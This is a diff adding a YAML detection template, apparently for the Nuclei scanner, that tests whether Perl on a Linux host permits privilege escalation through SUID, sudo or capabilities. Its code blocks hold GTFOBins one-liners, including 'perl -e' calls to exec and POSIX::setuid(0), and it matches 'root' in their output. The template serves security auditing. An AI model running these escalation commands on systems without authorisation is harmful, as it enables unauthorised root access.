@@ -1,0 +1,54 @@
+id: privilege-escalation-perl
+
+info:
+  name: Perl - Privilege Escalation
+  author: daffainfo
+  severity: high
+  reference: https://gtfobins.github.io/gtfobins/perl/
+  metadata:
+    verified: true
+  tags: code,linux,perl,privesc
+
+self-contained: true
+code:
+  - engine:
+      - sh
+      - bash
+    source: |
+        whoami
+
+  #SUID
+  - engine:
+      - sh
+      - bash
+    source: |
+        perl -e 'exec "whoami";'
+
+  #SUDO
+  - engine:
+      - sh
+      - bash
+    source: |
+        sudo perl -e 'exec "whoami";'
+
+  #Capabilities
+  - engine:
+      - sh
+      - bash
+    source: |
+        perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'
+
+    matchers-condition: and
+    matchers:
+       - type: word
+         part: code_1_response
+         words:
+           - "root"
+         negative: true
+
+      - type: dsl
+        dsl:
+          - 'contains(code_2_response, "root")'
+          - 'contains(code_3_response, "root")'
+          - 'contains(code_4_response, "root")'
+        condition: or
